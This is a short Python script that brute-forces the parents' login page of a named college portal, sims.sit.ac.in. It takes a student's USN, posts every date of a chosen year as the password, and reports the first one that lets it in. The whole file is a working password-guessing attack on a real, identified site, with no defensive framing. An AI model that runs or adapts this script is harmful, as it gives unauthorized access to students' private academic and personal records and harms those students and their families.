import requests

url = "https://sims.sit.ac.in/parents/index.php"
username = input("What is the USN you wish to attempt? ")
username = username.upper()
y = input("Which Year? (only checks for that particular year) ")
y = int(y)
m = input("Which Month to start from? (type 1 if you don't know where to start) ")
m = int(m)
d = input("Which Day to start from? (type 1 if you don't know where to start) ")
d = int(d)
print()

yyyy = y
while(yyyy < y+1):
	mm = m
	while(mm < 13):
		dd = d
		while(dd < 32):
			if dd < 10:
				dd = f'0{dd}'
			if mm < 10:
				mm = f'0{mm}'

			#print(f'Checking {yyyy}-{mm}-{dd}')
			passwd = f'{yyyy}-{mm}-{dd}'
			data = {'username':username,'dd':f'{dd}+', 'mm':mm, 'yyyy':yyyy, 'passwd':passwd, 'remember':'No', 'option':'com_user', 'task':'login', 'return':'%EF%BF%BDw%5E%C6%98i', 'return':'&48b141010cf67ef9200b6d9d052fade2=1', "Login":'submit'}
			send_data_url = requests.post(url, data=data)
			
			if username in send_data_url.text:
				print(f"Success, Password for {username} is {passwd} (yyyy-mm-dd) \n\r", end='', flush=True)
				exit(0)
			else:
				print(f"Password failed: {passwd} \r", end='', flush=True)

			dd = int(dd)
			mm = int(mm)
			dd += 1
		mm += 1
	yyyy += 1				
